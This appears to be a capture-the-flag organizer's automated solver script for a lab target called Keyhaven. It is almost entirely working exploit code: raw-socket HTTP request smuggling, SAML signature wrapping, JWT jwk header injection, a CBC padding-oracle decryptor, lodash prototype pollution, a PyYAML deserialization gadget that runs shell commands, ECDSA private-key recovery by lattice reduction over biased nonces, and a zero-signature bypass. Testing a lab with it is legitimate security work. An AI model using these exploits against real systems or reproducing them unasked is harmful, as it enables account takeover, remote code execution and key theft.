#!/usr/bin/env python3
"""
Keyhaven CTF — automated end-to-end solver / organizer self-check.

Drives all 7 stages + the bonus through the real path: smuggle past the edge
ACL, SAML-wrap to admin (which issues the corp gateway cookie), then exploit the
internal api / vault / signer through the authenticated /gw gateway.

Usage: solve.py <edge-base-url>      e.g. http://app.keyhaven.example
Exits 0 only if all 7 core flags are captured.
"""
import sys, os, re, socket, base64, json, hashlib, secrets, urllib.request, urllib.parse, urllib.error
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from hnp_solve import lll
from ecdsa import NIST256p, SigningKey
from ecdsa.util import sigencode_string
from ecdsa.numbertheory import inverse_mod
from ecdsa.ellipticcurve import Point

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://app.keyhaven.example"
u = urllib.parse.urlparse(BASE)
HOST, PORT = u.hostname, (u.port or 80)
G, N, CURVE = NIST256p.generator, NIST256p.order, NIST256p.curve

flags = {}
def mf(t): m = re.search(r"KH\{[^}]*\}", t or ""); return m.group(0) if m else None


# ---- raw-socket smuggle through the edge ----------------------------------
def smuggle(inner: bytes) -> str:
    body = b"0\r\n\r\n" + inner
    head = (b"POST /login HTTP/1.1\r\nHost: app\r\nContent-Length: %d\r\n"
            b"Transfer-Encoding: cow\r\nTransfer-Encoding: chunked\r\n\r\n" % len(body))
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(head + body); s.settimeout(5)
    data = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            data += d
    except socket.timeout:
        pass
    s.close()
    return data.decode("latin1")


# ---- authenticated gateway requests ---------------------------------------
COOKIE = None
def gw(path, method="GET", data=None, ctype="application/json"):
    headers = {}
    if COOKIE: headers["Cookie"] = f"kh_corp={COOKIE}"
    body = None
    if data is not None:
        body = data if isinstance(data, (bytes, bytearray)) else (
            json.dumps(data).encode() if ctype == "application/json" else data.encode())
        headers["Content-Type"] = ctype
    req = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=60)
        return r.getcode(), r.read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1")


def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


# ===========================================================================
print(f"== target edge: {BASE} ==")

# ---- STAGE 1: TE/CL request smuggling -------------------------------------
r = smuggle(b"GET /internal/bootstrap HTTP/1.1\r\nHost: sso\r\n\r\n")
flags[1] = mf(r); print("[1] smuggling            ", flags[1])

# ---- STAGE 2: SAML signature wrapping -> admin + corp cookie ---------------
rs = smuggle(b"GET /internal/saml/sample HTTP/1.1\r\nHost: sso\r\n\r\n")
cand = [l.strip() for l in rs.splitlines() if len(l.strip()) > 120 and re.fullmatch(r"[A-Za-z0-9+/=]+", l.strip())]
xml = base64.b64decode(cand[0]).decode()
ADMIN = ('<saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@keyhaven.example</saml:NameID>'
         '</saml:Subject><saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>'
         'admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>')
pos = xml.index("<saml:Assertion"); wrapped = xml[:pos] + ADMIN + xml[pos:]
form = ("SAMLResponse=" + urllib.parse.quote(base64.b64encode(wrapped.encode()).decode())).encode()
inner = (b"POST /internal/saml/acs HTTP/1.1\r\nHost: sso\r\n"
         b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s" % (len(form), form))
racs = smuggle(inner)
flags[2] = mf(racs)
m = re.search(r"kh_corp=([0-9a-f]+)", racs)
COOKIE = m.group(1) if m else None
print("[2] SAML XSW             ", flags[2], "(cookie ok)" if COOKIE else "(NO COOKIE)")

# ---- STAGE 3: node-jose jwk header injection -> forge admin JWT ------------
sk = SigningKey.generate(curve=NIST256p); p = sk.verifying_key.pubkey.point
jwk = {"kty": "EC", "crv": "P-256", "x": b64u(p.x().to_bytes(32, "big")), "y": b64u(p.y().to_bytes(32, "big"))}
hdr = b64u(json.dumps({"alg": "ES256", "jwk": jwk}, separators=(",", ":")).encode())
pl = b64u(json.dumps({"scope": "admin", "sub": "attacker@evil.com"}, separators=(",", ":")).encode())
si = f"{hdr}.{pl}"
sig = sk.sign(si.encode(), hashfunc=hashlib.sha256, sigencode=sigencode_string)
jwt = f"{si}.{b64u(sig)}"
code, body = gw("/gw/api/admin", data=None)  # need Authorization header
req = urllib.request.Request(BASE + "/gw/api/admin",
                             headers={"Cookie": f"kh_corp={COOKIE}", "Authorization": "Bearer " + jwt})
try:
    rr = urllib.request.urlopen(req, timeout=30); body = rr.read().decode()
except urllib.error.HTTPError as e:
    body = e.read().decode()
flags[3] = mf(body); print("[3] jwk injection        ", flags[3])

# ---- STAGE 4: CBC padding oracle ------------------------------------------
_, sb = gw("/gw/api/capability/sealed")
sealed = base64.b64decode(json.loads(sb)["sealed"])
def oracle(buf):
    c, b = gw("/gw/api/capability/open", "POST", {"token": base64.b64encode(buf).decode()})
    return c == 200 or "invalid mac" in b
bs = 16; blk = [sealed[i:i+bs] for i in range(0, len(sealed), bs)]
plain = bytearray(len(sealed) - bs)
for b in range(1, len(blk)):
    C, Cp, inter = blk[b], blk[b-1], bytearray(bs)
    for pad in range(1, bs + 1):
        pre = bytearray(bs)
        for k in range(pad - 1): pre[bs-1-k] = inter[bs-1-k] ^ pad
        found = 0
        for g in range(256):
            pre[bs-pad] = g
            if oracle(bytes(pre) + C):
                if pad == 1:
                    pre[bs-2] ^= 0xff; ok2 = oracle(bytes(pre) + C); pre[bs-2] ^= 0xff
                    if not ok2: continue
                found = g; break
        inter[bs-pad] = found ^ pad
    for k in range(bs): plain[(b-1)*bs + k] = inter[k] ^ Cp[k]
flags[4] = mf(plain.decode("latin1")); print("[4] CBC padding oracle   ", flags[4])

# ---- STAGE 5: lodash prototype pollution ----------------------------------
gw("/gw/api/config/update", "POST", {"constructor": {"prototype": {"yamlImportEnabled": True}}})
_, feat = gw("/gw/api/admin/features")
flags[5] = mf(feat); print("[5] prototype pollution  ", flags[5])

# ---- STAGE 6: PyYAML full_load RCE (via the now-enabled import) ------------
GADGET = ('!!python/object/new:type\n'
          'args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]\n'
          'listitems: "import os; open(\'/tmp/yaml_out\',\'w\').write(os.popen(\'cat /opt/vault/FLAG6.txt\').read())"\n')
_, imp = gw("/gw/api/config/import", "POST", GADGET, ctype="application/yaml")
flags[6] = mf(imp); print("[6] PyYAML full_load RCE ", flags[6])

# ---- STAGE 7: biased-nonce ECDSA -> HNP lattice key recovery (FINAL) -------
_, pk = gw("/gw/signer/pubkey"); pub = json.loads(pk)
Q = Point(CURVE, pub["Qx"], pub["Qy"], N); challenge = pub["challenge"]
BIAS = pub["nonce_bias_bits"]; K = 1 << (256 - BIAS); M = 8
t, a = [], []
for i in range(M):
    _, s7 = gw("/gw/signer/sign", "POST", {"message": f"rel-{i}-{secrets.token_hex(4)}"})
    s7 = json.loads(s7); inv = inverse_mod(s7["s"], N)
    t.append((inv * s7["r"]) % N); a.append((inv * s7["z"]) % N)
L = [[0]*(M+2) for _ in range(M+2)]
for i in range(M): L[i][i] = N*N
for i in range(M): L[M][i] = N*t[i]
L[M][M] = K
for i in range(M): L[M+1][i] = N*a[i]
L[M+1][M+1] = K*N
red = lll(L)
d = None
for row in red:
    cands = []
    if row[M+1] != 0 and row[M] % K == 0: cands += [row[M]//K, -row[M]//K]
    if row[0] % N == 0:
        k0 = (row[0]//N) % N
        cands += [((k0 - a[0]) * inverse_mod(t[0], N)) % N, ((-k0 - a[0]) * inverse_mod(t[0], N)) % N]
    for c in cands:
        if c % N and (c % N) * G == Q: d = c % N; break
    if d: break
if d:
    z = int.from_bytes(hashlib.sha256(challenge.encode()).digest(), "big") % N
    while True:
        k = secrets.randbelow(N-1)+1; r7 = (k*G).x() % N
        if r7 == 0: continue
        s7 = (inverse_mod(k, N) * (z + r7*d)) % N
        if s7: break
    _, fo = gw("/gw/signer/forge", "POST", {"r": r7, "s": s7})
    flags[7] = mf(fo)
print("[7] HNP lattice (FINAL)  ", flags[7])

# ---- BONUS: Psychic Signatures (0,0) --------------------------------------
_, bo = gw("/gw/signer/verify-manifest", "POST", {"r": 0, "s": 0})
print("[B] psychic signature    ", mf(bo))

print("\n== flags ==")
for i in range(1, 8): print(f"  FLAG {i}: {flags.get(i) or '<missing>'}")
ok = all(flags.get(i, "").startswith("KH{") for i in range(1, 8))
print("\nRESULT:", "ALL 7 CORE FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
